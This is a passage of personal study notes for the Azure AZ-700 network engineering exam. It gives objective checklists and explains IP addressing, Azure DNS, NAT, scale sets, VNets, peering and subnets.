<li><input disabled="" type="checkbox" checked=""> Configure listeners</li>
<li><input disabled="" type="checkbox" checked=""> Configure routing rules</li>
<li><input disabled="" type="checkbox" checked=""> Configure HTTP settings</li>
<li><input disabled="" type="checkbox" checked=""> Configure Transport Layer Security (TLS)</li>
<li><input disabled="" type="checkbox" checked=""> Configure rewrite sets</li>
</ul>
<h2 id="design-and-implement-azure-front-door"><a class="header" href="#design-and-implement-azure-front-door">Design and Implement Azure Front Door</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Map requirements to features and capabilities of Azure Front Door</li>
<li><input disabled="" type="checkbox" checked=""> Identify appropriate use cases for Azure Front Door</li>
<li><input disabled="" type="checkbox"> Choose an appropriate tier</li>
<li><input disabled="" type="checkbox"> Configure an Azure Front Door, including routing, origins, and endpoints</li>
<li><input disabled="" type="checkbox"> Configure SSL termination and end-to-end SSL encryption</li>
<li><input disabled="" type="checkbox"> Configure caching</li>
<li><input disabled="" type="checkbox"> Configure traffic acceleration</li>
<li><input disabled="" type="checkbox"> Implement rules, URL rewrite, and URL redirect</li>
<li><input disabled="" type="checkbox"> Secure an origin using Azure Private Link in Azure Front Door</li>
</ul>
<h2 id="design-and-implement-azure-traffic-manager"><a class="header" href="#design-and-implement-azure-traffic-manager">Design and Implement Azure Traffic Manager</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Identify appropriate use cases for Azure Traffic Manager</li>
<li><input disabled="" type="checkbox" checked=""> Configure a routing method</li>
<li><input disabled="" type="checkbox" checked=""> Configure endpoints</li>
</ul>
<h1 id="design-and-implement-private-access-to-azure-services-checklist"><a class="header" href="#design-and-implement-private-access-to-azure-services-checklist">Design and Implement Private Access to Azure Services Checklist</a></h1>
<h2 id="design-and-implement-azure-private-link-service-and-azure-private-endpoints"><a class="header" href="#design-and-implement-azure-private-link-service-and-azure-private-endpoints">Design and Implement Azure Private Link Service and Azure Private Endpoints</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Plan an Azure Private Link service</li>
<li><input disabled="" type="checkbox" checked=""> Create a Private Link service</li>
<li><input disabled="" type="checkbox" checked=""> Integrate a Private Link service with DNS</li>
<li><input disabled="" type="checkbox" checked=""> Plan private endpoints</li>
<li><input disabled="" type="checkbox" checked=""> Create private endpoints</li>
<li><input disabled="" type="checkbox" checked=""> Configure access to Azure resources using private endpoints</li>
<li><input disabled="" type="checkbox" checked=""> Connect on-premises clients to a private endpoint</li>
<li><input disabled="" type="checkbox" checked=""> Integrate a private endpoint with DNS</li>
</ul>
<h2 id="design-and-implement-service-endpoints"><a class="header" href="#design-and-implement-service-endpoints">Design and Implement Service Endpoints</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Choose when to use a service endpoint</li>
<li><input disabled="" type="checkbox" checked=""> Create service endpoints</li>
<li><input disabled="" type="checkbox" checked=""> Configure service endpoint policies</li>
<li><input disabled="" type="checkbox" checked=""> Configure access to service endpoints</li>
</ul>
<h1 id="secure-network-connectivity-to-azure-resources-checklist"><a class="header" href="#secure-network-connectivity-to-azure-resources-checklist">Secure Network Connectivity to Azure Resources Checklist</a></h1>
<h2 id="implement-and-manage-network-security-groups-nsgs"><a class="header" href="#implement-and-manage-network-security-groups-nsgs">Implement and Manage Network Security Groups (NSGs)</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Create a network security group (NSG)</li>
<li><input disabled="" type="checkbox" checked=""> Associate an NSG to a resource</li>
<li><input disabled="" type="checkbox" checked=""> Create an application security group (ASG)</li>
<li><input disabled="" type="checkbox" checked=""> Associate an ASG to a network interface card (NIC)</li>
<li><input disabled="" type="checkbox" checked=""> Create and configure NSG rules</li>
<li><input disabled="" type="checkbox" checked=""> Interpret NSG flow logs</li>
<li><input disabled="" type="checkbox" checked=""> Validate NSG flow rules</li>
<li><input disabled="" type="checkbox" checked=""> Verify IP flow</li>
<li><input disabled="" type="checkbox" checked=""> Configure an NSG for remote server administration, including Azure Bastion</li>
</ul>
<h2 id="design-and-implement-azure-firewall-and-azure-firewall-manager"><a class="header" href="#design-and-implement-azure-firewall-and-azure-firewall-manager">Design and Implement Azure Firewall and Azure Firewall Manager</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Map requirements to features and capabilities of Azure Firewall</li>
<li><input disabled="" type="checkbox"> Select an appropriate Azure Firewall SKU</li>
<li><input disabled="" type="checkbox" checked=""> Design an Azure Firewall deployment</li>
<li><input disabled="" type="checkbox" checked=""> Create and implement an Azure Firewall deployment</li>
<li><input disabled="" type="checkbox" checked=""> Configure Azure Firewall rules</li>
<li><input disabled="" type="checkbox" checked=""> Create and implement Azure Firewall Manager policies</li>
<li><input disabled="" type="checkbox" checked=""> Create a secure hub by deploying Azure Firewall inside an Azure Virtual WAN hub</li>
</ul>
<h2 id="design-and-implement-a-web-application-firewall-waf-deployment"><a class="header" href="#design-and-implement-a-web-application-firewall-waf-deployment">Design and Implement a Web Application Firewall (WAF) Deployment</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Map requirements to features and capabilities of WAF</li>
<li><input disabled="" type="checkbox" checked=""> Design a WAF deployment</li>
<li><input disabled="" type="checkbox" checked=""> Configure detection or prevention mode</li>
<li><input disabled="" type="checkbox" checked=""> Configure rule sets for WAF on Azure Front Door</li>
<li><input disabled="" type="checkbox" checked=""> Configure rule sets for WAF on Application Gateway</li>
<li><input disabled="" type="checkbox" checked=""> Implement a WAF policy</li>
<li><input disabled="" type="checkbox" checked=""> Associate a WAF policy</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="design-and-implement-core-network-infra"><a class="header" href="#design-and-implement-core-network-infra">Design-and-implement-core-network-infra</a></h1>
<h2 id="directory-map-5"><a class="header" href="#directory-map-5">Directory Map</a></h2>
<ul>
<li><a href="#ipv4-and-ipv6-addressing">ip-addressing</a></li>
<li><a href="#azure-dns">name-resolution</a></li>
<li><a href="#azure-virtual-network-nat">nat</a></li>
<li><a href="#subnets">subnets</a></li>
<li><a href="#virtual-machine-scale-sets">vmss</a></li>
<li><a href="#azure-virtual-network-vnet">vnet</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ipv4-and-ipv6-addressing"><a class="header" href="#ipv4-and-ipv6-addressing">IPv4 and IPv6 Addressing</a></h1>
<h2 id="ipv4-addressing"><a class="header" href="#ipv4-addressing">IPv4 Addressing</a></h2>
<p><strong>Definition:</strong>
IPv4 (Internet Protocol version 4) is the fourth version of the Internet Protocol (IP). It is the most widely used IP version for connecting devices to the internet.</p>
<p><strong>Format:</strong></p>
<ul>
<li>IPv4 addresses are 32-bit numerical labels.</li>
<li>Represented in decimal format as four octets separated by periods (e.g., 192.168.1.1).</li>
<li>Each octet can range from 0 to 255.</li>
</ul>
<p><strong>Classes:</strong></p>
<ul>
<li><strong>Class A:</strong> <code>0.0.0.0</code> to <code>127.255.255.255</code> (large networks)</li>
<li><strong>Class B:</strong> <code>128.0.0.0</code> to <code>191.255.255.255</code> (medium-sized networks)</li>
<li><strong>Class C:</strong> <code>192.0.0.0</code> to <code>223.255.255.255</code> (small networks)</li>
<li><strong>Class D:</strong> <code>224.0.0.0</code> to <code>239.255.255.255</code> (multicast)</li>
<li><strong>Class E:</strong> <code>240.0.0.0</code> to <code>255.255.255.255</code> (experimental)</li>
</ul>
<p><strong>Special Addresses:</strong></p>
<ul>
<li><strong>Private Addresses:</strong>
<ul>
<li>Class A: <code>10.0.0.0</code> to <code>10.255.255.255</code></li>
<li>Class B: <code>172.16.0.0</code> to <code>172.31.255.255</code></li>
<li>Class C: <code>192.168.0.0</code> to <code>192.168.255.255</code></li>
</ul>
</li>
<li><strong>Loopback Address:</strong> <code>127.0.0.1</code></li>
<li><strong>Broadcast Address:</strong> <code>255.255.255.255</code></li>
</ul>
<p><strong>Limitations:</strong></p>
<ul>
<li>Limited address space (about 4.3 billion addresses).</li>
<li>Exhaustion of available addresses.</li>
</ul>
<h2 id="ipv6-addressing"><a class="header" href="#ipv6-addressing">IPv6 Addressing</a></h2>
<p><strong>Definition:</strong>
IPv6 (Internet Protocol version 6) is the successor to IPv4, designed to address the limitations and address exhaustion of IPv4.</p>
<p><strong>Format:</strong></p>
<ul>
<li>IPv6 addresses are 128-bit numerical labels.</li>
<li>Represented in hexadecimal format as eight groups of four hexadecimal digits separated by colons (e.g., 2001:0db8:85a3:0000:0000:8a2e:0370:7334).</li>
<li>Leading zeros in each group can be omitted, and consecutive groups of zeros can be replaced with ‚Äú::‚Äù (e.g., 2001:db8:85a3::8a2e:370:7334).</li>
</ul>
<p><strong>Special Addresses:</strong></p>
<ul>
<li><strong>Unicast Addresses:</strong> Identifies a single interface.
<ul>
<li><strong>Global Unicast:</strong> Globally unique (e.g., 2000::/3).</li>
<li><strong>Link-Local:</strong> Used within a single network segment (e.g., fe80::/10).</li>
</ul>
</li>
<li><strong>Multicast Addresses:</strong> Identifies multiple interfaces (e.g., ff00::/8).</li>
<li><strong>Anycast Addresses:</strong> Assigned to multiple interfaces, with packets delivered to the nearest one.</li>
<li><strong>Loopback Address:</strong> <code>::1</code></li>
<li><strong>Unique Local Addresses (ULA):</strong> <code>fc00::/7</code></li>
</ul>
<p><strong>Advantages:</strong></p>
<ul>
<li>Vast address space (2^128 addresses).</li>
<li>Improved routing efficiency and hierarchical addressing.</li>
<li>Simplified packet header for better performance.</li>
<li>Enhanced security features (mandatory IPsec support).</li>
<li>Auto-configuration capabilities.</li>
</ul>
<h2 id="comparison"><a class="header" href="#comparison">Comparison</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Feature</th><th>IPv4</th><th>IPv6</th></tr>
</thead>
<tbody>
<tr><td>Address Length</td><td>32 bits</td><td>128 bits</td></tr>
<tr><td>Address Format</td><td>Decimal (e.g., 192.168.1.1)</td><td>Hexadecimal (e.g., 2001:db8::1)</td></tr>
<tr><td>Address Space</td><td>~4.3 billion addresses</td><td>Virtually unlimited (2^128 addresses)</td></tr>
<tr><td>Header Complexity</td><td>More complex</td><td>Simplified</td></tr>
<tr><td>Configuration</td><td>Manual or DHCP</td><td>Auto-configuration (stateless)</td></tr>
<tr><td>Security</td><td>Optional (IPsec)</td><td>Mandatory (IPsec)</td></tr>
</tbody>
</table>
</div>
<p>IPv4 and IPv6 are both critical for networking, with IPv6 designed to overcome the limitations of IPv4 and ensure the continued growth and scalability of the internet.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-dns"><a class="header" href="#azure-dns">Azure DNS</a></h1>
<h2 id="definition"><a class="header" href="#definition">Definition</a></h2>
<p>Azure DNS is a cloud-based Domain Name System (DNS) service provided by Microsoft Azure. It allows you to host your DNS domains alongside your Azure resources, enabling you to manage DNS records using the same credentials, APIs, tools, and billing as your other Azure services.</p>
<h2 id="key-features-1"><a class="header" href="#key-features-1">Key Features</a></h2>
<ol>
<li>
<p><strong>Global Reach:</strong></p>
<ul>
<li>Azure DNS uses a global network of name servers to provide fast DNS responses and high availability.</li>
<li>DNS queries are answered from the closest DNS server to the end user.</li>
</ul>
</li>
<li>
<p><strong>DNS Zones:</strong></p>
<ul>
<li>Host your DNS domain in Azure DNS by creating a DNS zone.</li>
<li>A DNS zone is used to manage the DNS records for a specific domain.</li>
</ul>
</li>
<li>
<p><strong>DNS Records:</strong></p>
<ul>
<li>Support for all common DNS record types, including A, AAAA, CNAME, MX, NS, PTR, SOA, SRV, and TXT.</li>
<li>Manage records through the Azure portal, Azure CLI, Azure PowerShell, and REST API.</li>
</ul>
</li>
<li>
<p><strong>Alias Records:</strong></p>
<ul>
<li>Alias records allow you to map DNS names to Azure resources like Azure Traffic Manager, public IP addresses, and Azure Content Delivery Network (CDN) endpoints.</li>
<li>Automatically update DNS records when the underlying Azure resources change.</li>
</ul>
</li>
<li>
<p><strong>Integration with Azure Services:</strong></p>
<ul>
<li>Seamlessly integrate with other Azure services for dynamic DNS updates and automated DNS management.</li>
<li>Use Azure Private DNS for internal domain name resolution within your Azure virtual networks.</li>
</ul>
</li>
<li>
<p><strong>Security:</strong></p>
<ul>
<li>DNS queries are secured with DNSSEC (DNS Security Extensions) to protect against spoofing and cache poisoning.</li>
<li>Role-Based Access Control (RBAC) to manage permissions and access to DNS zones and records.</li>
</ul>
</li>
<li>
<p><strong>Scalability:</strong></p>
<ul>
<li>Azure DNS is designed to handle large-scale DNS workloads.</li>
<li>Scalable to meet the needs of high-traffic domains.</li>
</ul>
</li>
<li>
<p><strong>Monitoring and Analytics:</strong></p>
<ul>
<li>Monitor DNS queries and traffic patterns using Azure Monitor.</li>
<li>View detailed metrics and logs for DNS performance and availability.</li>
</ul>
</li>
</ol>
<h2 id="best-practices"><a class="header" href="#best-practices">Best Practices</a></h2>
<ol>
<li>
<p><strong>Zone Management:</strong></p>
<ul>
<li>Use descriptive names for DNS zones to clearly identify their purpose.</li>
<li>Organize DNS zones to reflect the structure of your organization or application.</li>
</ul>
</li>
<li>
<p><strong>Record Management:</strong></p>
<ul>
<li>Use alias records to simplify DNS management for Azure resources.</li>
<li>Regularly review and update DNS records to ensure accuracy.</li>
</ul>
</li>
<li>
<p><strong>Security:</strong></p>
<ul>
<li>Implement DNSSEC to enhance the security of your DNS infrastructure.</li>
<li>Use RBAC to control access to DNS zones and records.</li>
</ul>
</li>
<li>
<p><strong>Monitoring:</strong></p>
<ul>
<li>Enable monitoring and logging for DNS zones to detect and troubleshoot issues.</li>
<li>Set up alerts for unusual DNS activity or changes in traffic patterns.</li>
</ul>
</li>
</ol>
<h2 id="use-cases-3"><a class="header" href="#use-cases-3">Use Cases</a></h2>
<ul>
<li><strong>Hosting DNS Domains:</strong> Manage DNS records for your domains within Azure.</li>
<li><strong>Internal Domain Resolution:</strong> Use Azure Private DNS for internal name resolution within virtual networks.</li>
<li><strong>Application Delivery:</strong> Optimize DNS routing with Azure Traffic Manager for high availability and performance.</li>
<li><strong>Automated DNS Management:</strong> Integrate with Azure services for dynamic DNS updates and automation.</li>
</ul>
<p>Azure DNS provides a reliable and scalable DNS service that simplifies domain management and integrates seamlessly with your Azure infrastructure.</p>
<h2 id="internal-private-name-resolution-scenarios-and-options"><a class="header" href="#internal-private-name-resolution-scenarios-and-options">Internal (Private) Name Resolution Scenarios and Options</a></h2>
<ul>
<li>
<p>Scenarios:</p>
<ul>
<li><strong>Name Resolution within a Virtual Network:</strong> Resolve names of resources within the same virtual network.</li>
<li><strong>Name Resolution between Virtual Networks:</strong> Resolve names of resources across different virtual networks.</li>
<li><strong>Name Resolution between On-Premises and Azure:</strong> Resolve names of resources between on-premises networks and Azure virtual networks.</li>
</ul>
</li>
<li>
<p>Options:</p>
<ul>
<li>
<p><strong>Azure-provided DNS:</strong> Use Azure-provided DNS for name resolution within a virtual network.</p>
<ul>
<li>This is the default when you create a virtual network in Azure. Anytime you create a vNet in Azure, the platform configures it to use this option and assigns a unique private DNS suffix to it in the <autogenerated random-id="">.internal.cloudapp.net format. Azure‚Äôs DHCP will assign this DNS suffix to any resource that obtains an IP address.</autogenerated></li>
<li>The default Azure provided DNS Server uses a virtual IP address of 168.63.129.16. This server limits each client to 1000 queries per second. Anything above this is throttled.</li>
<li>This option can only cover scenario 1 above (Name Resolution within a Virtual Network).</li>
<li>This option does not support WINS or NetBios.</li>
<li>We cannot enable or configure logging within this option.</li>
</ul>
</li>
<li>
<p><strong>Custom DNS:</strong> Configure custom DNS servers for name resolution within a virtual network.</p>
<ul>
<li>You can host your own DNS server and forward name resolution requests to it.</li>
</ul>
</li>
<li>
<p><strong>Azure Private DNS:</strong> Use Azure Private DNS for name resolution between virtual networks and on-premises networks.</p>
<ul>
<li>Azure Private DNS provides a reliable, secure DNS service to manage and resolve domain names in a virtual network without the need for a custom DNS solution.</li>
<li>This service can be used to create forward and reverse DNS zones (up to a max of 1000 per subscription).</li>
<li>An Azure Private DNS Zone can contain up to 25000 record sets, and supports all common record types.</li>
<li>After you create a Private DNS zone, it must be ‚Äòlinked‚Äô to a vNet.</li>
<li>When linking a Private DNS Zone to a vNet, you can choose to enable auto-registration of virtual machines in the vNet to the DNS zone. This will automatically register the VM‚Äôs hostname and IP address in the DNS zone.</li>
<li>A virtual network can be linked to multiple private DNS zones, but it can only be linked to one private DNS zone with auto-registration enabled.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="public-name-resolution-scenarios-and-options"><a class="header" href="#public-name-resolution-scenarios-and-options">Public Name Resolution Scenarios and Options</a></h2>
<ul>
<li>Scenarios:
<ul>
<li><strong>Name Resolution for Internet Clients:</strong> Resolve names of resources for clients on the internet.</li>
</ul>
</li>
<li>Options:
<ul>
<li><strong>Azure DNS:</strong> Use Azure DNS for public name resolution.
<ul>
<li>Azure DNS is a cloud-based DNS service that hosts your DNS domains and provides name resolution for internet clients.</li>
<li>You can manage DNS records for your domains using Azure DNS and integrate it with other Azure services.</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-virtual-network-nat"><a class="header" href="#azure-virtual-network-nat">Azure Virtual Network NAT</a></h1>
<ul>
<li>Azure Virtual Network NAT (Network Address Translation) is a service that enables outbound connectivity for virtual networks. It allows virtual machines (VMs) in a virtual network to access the internet without public IP addresses. NAT simplifies outbound connectivity for VMs by translating their private IP addresses to a public IP address.</li>
</ul>
<h3 id="azure-virtual-network-nat-provides-the-following-key-features-and-benefits"><a class="header" href="#azure-virtual-network-nat-provides-the-following-key-features-and-benefits">Azure Virtual Network NAT provides the following key features and benefits:</a></h3>
<ul>
<li><strong>Outbound Connectivity</strong>: NAT enables VMs in a virtual network to access the internet for software updates, package downloads, and other external services without requiring public IP addresses on the VMs themselves.</li>
<li><strong>Security</strong>: NAT helps secure your virtual network by hiding the private IP addresses of VMs from external sources. Only the public IP address of the NAT gateway is exposed to the internet.</li>
<li><strong>Cost-Effective</strong>: NAT reduces the need for public IP addresses on individual VMs, which can help lower costs associated with IP address management.</li>
<li><strong>Scalability</strong>: NAT can handle high volumes of outbound traffic from multiple VMs in a virtual network, providing scalable outbound connectivity for your applications.</li>
<li><strong>Ease of Management</strong>: NAT simplifies outbound connectivity configuration by providing a centralized service for translating private IP addresses to a public IP address.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="subnets"><a href="#subnets" class="header">Subnets</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="virtual-machine-scale-sets"><a class="header" href="#virtual-machine-scale-sets">Virtual Machine Scale Sets</a></h1>
<p>Azure Virtual Machine Scale Sets offer a robust and flexible solution for deploying, managing, and scaling applications, ensuring high availability and optimal performance to meet varying demands.</p>
<h2 id="overview"><a class="header" href="#overview">Overview</a></h2>
<ul>
<li>Used to create and manage a group of identical, load balanced VMs</li>
<li>Traffic will be distributed to the VM instances via a load balancer service</li>
<li>VM instances are managed by a single Azure Resource Manager template</li>
<li>VM instances can be automatically scaled in or out based on demand or a defined schedule</li>
<li>VM instances can be automatically healed if they become unhealthy</li>
<li>VM instances can be automatically updated with the latest OS image</li>
<li>VM instances can be automatically deployed across multiple fault domains and update domains</li>
<li>VM instances can be automatically deployed across multiple regions</li>
<li>VM instances can be automatically deployed across multiple availability zones</li>
</ul>
<h2 id="use-cases-4"><a class="header" href="#use-cases-4">Use Cases</a></h2>
<ul>
<li>Web front ends</li>
<li>API services</li>
<li>Batch processing</li>
<li>Containers</li>
<li>Microservices</li>
</ul>
<h2 id="components"><a class="header" href="#components">Components</a></h2>
<ul>
<li><strong>Scale Set</strong>: The group of identical VM instances</li>
<li><strong>Load Balancer</strong>: Distributes traffic to the VM instances</li>
<li><strong>Health Probe</strong>: Monitors the health of the VM instances</li>
<li><strong>Scale Out</strong>: Increases the number of VM instances</li>
<li><strong>Scale In</strong>: Decreases the number of VM instances</li>
<li><strong>Auto Scale</strong>: Automatically scales the number of VM instances based on demand or a defined schedule</li>
<li><strong>Auto Heal</strong>: Automatically heals unhealthy VM instances</li>
<li><strong>Auto Update</strong>: Automatically updates the OS image of the VM instances</li>
<li><strong>Fault Domain</strong>: A group of VM instances that share a common power source and network switch</li>
<li><strong>Update Domain</strong>: A group of VM instances that are updated together</li>
</ul>
<h2 id="pricing-3"><a class="header" href="#pricing-3">Pricing</a></h2>
<ul>
<li>Pay only for the VM instances that are running</li>
<li>No additional charge for the scale set service</li>
<li>No additional charge for the load balancer service</li>
<li>No additional charge for the health probe service</li>
</ul>
<h2 id="scaling"><a class="header" href="#scaling">Scaling</a></h2>
<ul>
<li><strong>Manual Scaling</strong>: Increase or decrease the number of VM instances manually</li>
<li><strong>Auto Scaling</strong>: Automatically increase or decrease the number of VM instances based on demand or a defined schedule</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-virtual-network-vnet"><a class="header" href="#azure-virtual-network-vnet">Azure Virtual Network (VNet)</a></h1>
<p>TOC</p>
<h2 id="introduction-23"><a class="header" href="#introduction-23">Introduction</a></h2>
<p><strong>Definition:</strong></p>
<ul>
<li>Azure Virtual Network (VNet) is a fundamental component of Microsoft Azure, allowing you to create private networks within the Azure cloud. These networks can be isolated or connected to on-premises data centers, providing a flexible and secure environment for deploying and managing resources. Azure Virtual Network provides the flexibility, security, and scalability needed to build robust cloud-based network infrastructures, supporting a wide range of applications and services.</li>
</ul>
<h2 id="key-features-2"><a class="header" href="#key-features-2">Key Features:</a></h2>
<ol>
<li>
<p><strong>Isolation and Segmentation:</strong></p>
<ul>
<li>Create isolated networks for your resources.</li>
<li>Use subnets to segment the VNet into smaller address spaces for organization and security.</li>
</ul>
</li>
<li>
<p><strong>Security:</strong></p>
<ul>
<li>Implement Network Security Groups (NSGs) to control inbound and outbound traffic.</li>
<li>Use Azure Firewall for advanced network security.</li>
</ul>
</li>
<li>
<p><strong>Connectivity:</strong></p>
<ul>
<li>Connect VNets to each other using VNet peering.</li>
<li>Link your VNet to on-premises networks using VPN Gateway or ExpressRoute.</li>
<li>Enable secure connections to the internet or other Azure services.</li>
</ul>
</li>
<li>
<p><strong>Scalability and Availability:</strong></p>
<ul>
<li>Scale your network by adding or resizing subnets.</li>
<li>Ensure high availability with Azure‚Äôs global infrastructure.</li>
</ul>
</li>
<li>
<p><strong>Integration with Azure Services:</strong></p>
<ul>
<li>Seamlessly integrate with Azure services like Azure Kubernetes Service (AKS), Azure App Service, and Azure Storage.</li>
<li>Use service endpoints to secure your Azure services within your VNet.</li>
</ul>
</li>
<li>
<p><strong>DNS and Customization:</strong></p>
<ul>
<li>Customize DNS settings for your VNet.</li>
<li>Use Azure-provided DNS or bring your own DNS servers.</li>
</ul>
</li>
<li>
<p><strong>Monitoring and Troubleshooting:</strong></p>
<ul>
<li>Monitor network performance and security with Azure Monitor and Network Watcher.</li>
<li>Diagnose and troubleshoot network issues efficiently.</li>
</ul>
</li>
</ol>
<h2 id="use-cases-5"><a class="header" href="#use-cases-5">Use Cases:</a></h2>
<ul>
<li>Deploying multi-tier applications with web, application, and database layers.</li>
<li>Extending on-premises networks to the cloud.</li>
<li>Isolating development, testing, and production environments.</li>
<li>Ensuring secure access to Azure services.</li>
<li>In addition to virtual machines, we can deploy more than 32 other services in a VNet.</li>
<li>Native internal TCP/UDP load balancing and proxy systems for internal HTTP/s load balancing.</li>
<li>Connect to on-premises networks to form hybrid network architectures.</li>
</ul>
<h2 id="differences-between-vnet-and-on-premises-network"><a class="header" href="#differences-between-vnet-and-on-premises-network">Difference‚Äôs between vNet and On-premises network:</a></h2>
<ul>
<li>
<p>Azure vNets do not support layer 2 semantics (only layer-3 and layer-4). This means that concepts such as vLANs and layer-2 broadcast/multicast are not supported. Running <code>arp -a</code> on a VM in Azure will show that MAC address resolution for VMs in the same subnet results in th esame <code>12:34:56:78:9a:bc</code> value. This is because we are on a shared platoform and the vNet is a layer-3 construct.
<img src="clouds/azure/az700/images/arp.png" alt=""></p>
</li>
<li>
<p>Some protocols and communication types are restricted from being used in Azure vNets. Protocols such as multicast, broadcast, DHCP Unicast, UDP source port 65330, IP-in-IP encapsulated packets, and GRE are not supported.</p>
</li>
</ul>
<h2 id="vnet-naming"><a class="header" href="#vnet-naming">vNet Naming</a></h2>
<ul>
<li>You can have two vNets in an Azure subscription with the same name as long as they are in different resource groups.</li>
</ul>
<h2 id="address-spaces"><a class="header" href="#address-spaces">Address Spaces</a></h2>
<ul>
<li>When creating a VNet, you must specify an address space. This address space is a range of IP addresses that can be used by the resources in the VNet.</li>
<li>The address space can be either IPv4 or IPv6. However, a vNet cannot be IPv6 only.</li>
<li>You can create multiple address spaces in a vNet.</li>
<li>Though, you can use any address space, it is recommended to use a private address space as defined in RFC 1918. (10.0.0.0/8, 172.16.0.0/12, or 192.168.0.0/16)</li>
<li>You cannot peer vNets with overlapping address spaces.</li>
</ul>
<h2 id="peering"><a class="header" href="#peering">Peering</a></h2>
<ul>
<li>vNET peering allows us to transfer data between vNETs within and across Azure Subscriptions.</li>
<li>Connect VNETs together using the Azure backbone network so that resources within the subnets can ‚Äòtalk‚Äô to each other</li>
<li>VNETs with overlapping address spaces cannot be peered</li>
<li>vNET peering is easy to implement, no additional infrastructure is required. Peering can be setup between vNETs within minutes.</li>
<li>To implement the peering connection, the Network Contributor role or a custom role with the following permissions is required for both the source and destination vNETs:
<ul>
<li>Microsoft.Network/virtualNetworks/peer/action</li>
<li>Microsoft.Network/virtualNetworks/virtualNetworkPeerings/write</li>
<li>Microsoft.Network/virtualNetworks/virtualNetworkPeerings/read</li>
</ul>
</li>
<li>vNET peering is not transitive. If vNET A is peered with vNET B and vNET B is peered with vNET C, vNET A and vNET C are not peered.</li>
</ul>
<h2 id="connection-vnets-using-a-vpn-gateway"><a class="header" href="#connection-vnets-using-a-vpn-gateway">Connection vNETs using a VPN Gateway</a></h2>
<ul>
<li>In addition to peering, another option for connecting vNETs is to use a VPN Gateway connection.</li>
<li>This option uses an Azure VPN Gateway to create a secure IPSec/IKE tunnel to the target network.</li>
<li>Unlike peering, traffic is routed over the public internet and not the Azure backbone network.</li>
<li>Deploying the VPN Gateway takes around 40 minutes.</li>
<li>When implementing the VPN Gateway to connect two vNETs, there are two connection types that we can use:
<ul>
<li>vNET-to-vNET: Connects two vNETs in the same Azure Subscription.</li>
<li>Site-to-Site: Connects two vNETs in different Azure Subscriptions</li>
</ul>
</li>
<li>You can use this option to connect vNETs with overlapping address spaces by configuring NAT rules on the VPN Gateway</li>
</ul>
<h2 id="vwan-hub"><a class="header" href="#vwan-hub">vWAN Hub</a></h2>
<p><a href="#azure-virtual-wan">vWAN Notes</a></p>
<h3 id="comparing-vnet-peering-vs-vpn-gateway-vs-vwan-hub"><a class="header" href="#comparing-vnet-peering-vs-vpn-gateway-vs-vwan-hub">Comparing vNET Peering vs. VPN Gateway vs. vWAN Hub</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Feature</th><th>Peering</th><th>VNET Gateway</th><th>vWAN Hub</th></tr>
</thead>
<tbody>
<tr><td><strong>Definition</strong></td><td>Direct connection between VNets</td><td>Connection using a VPN gateway</td><td>Connection via Virtual WAN Hub</td></tr>
<tr><td><strong>Use Case</strong></td><td>Low latency, high-speed connection within the same region</td><td>Secure cross-region or hybrid connectivity</td><td>Scalable, centralized management of large-scale network architecture</td></tr>
<tr><td><strong>Bandwidth</strong></td><td>Up to 10 Gbps</td><td>Dependent on gateway SKU</td><td>Up to 20 Gbps (depending on the hub scale)</td></tr>
<tr><td><strong>Latency</strong></td><td>Low</td><td>Higher due to encryption</td><td>Variable, generally higher than peering</td></tr>
<tr><td><strong>Encryption</strong></td><td>Not supported</td><td>Supported</td><td>Supported</td></tr>
<tr><td><strong>Routing</strong></td><td>Manual configuration</td><td>Supports BGP, more complex routing</td><td>Simplified with centralized control</td></tr>
<tr><td><strong>Cost</strong></td><td>Lower, based on data transfer</td><td>Higher, based on gateway and data transfer</td><td>Variable, based on hub and data transfer</td></tr>
<tr><td><strong>Scalability</strong></td><td>Limited to same region</td><td>Cross-region, but limited by gateway scale</td><td>Highly scalable for global networks</td></tr>
<tr><td><strong>Security</strong></td><td>Less secure, no encryption</td><td>More secure with encryption</td><td>High security with built-in features</td></tr>
<tr><td><strong>Complexity</strong></td><td>Simple to configure</td><td>Moderate complexity</td><td>High complexity, but with centralized management tools</td></tr>
<tr><td><strong>Cross-Subscription</strong></td><td>Supported</td><td>Supported</td><td>Supported</td></tr>
<tr><td><strong>Cross-Tenant</strong></td><td>Not supported</td><td>Not supported</td><td>Supported</td></tr>
<tr><td><strong>Redundancy</strong></td><td>Depends on setup</td><td>High availability supported</td><td>High availability and redundancy supported</td></tr>
<tr><td><strong>Additional Features</strong></td><td>Supports private endpoints and service chaining</td><td>Supports VPN, ExpressRoute</td><td>Integrated with Azure Firewall, Application Gateway, etc.</td></tr>
</tbody>
</table>
</div>
<hr>
<h1 id="azure-subnets"><a class="header" href="#azure-subnets">Azure Subnets</a></h1>
<h2 id="definition-1"><a class="header" href="#definition-1">Definition</a></h2>
<p>Azure subnets are subdivisions of an Azure Virtual Network (VNet). They help organize and secure your Azure resources by segmenting the VNet into smaller, manageable sections.</p>
<h2 id="key-features-1-1"><a class="header" href="#key-features-1-1">Key Features</a></h2>
<ol>
<li>
<p><strong>IP Address Range:</strong></p>
<ul>
<li>Each subnet must have a unique IP address range within the VNet.</li>
<li>The address range is defined in CIDR notation (e.g., 10.0.0.0/24).</li>
</ul>
</li>
<li>
<p><strong>Network Security:</strong></p>
<ul>
<li>Use Network Security Groups (NSGs) to control inbound and outbound traffic at the subnet level.</li>
<li>NSGs can be associated with one or more subnets, defining security rules for the subnet.</li>
</ul>
</li>
<li>
<p><strong>Routing:</strong></p>
<ul>
<li>Subnets can have custom route tables associated with them.</li>
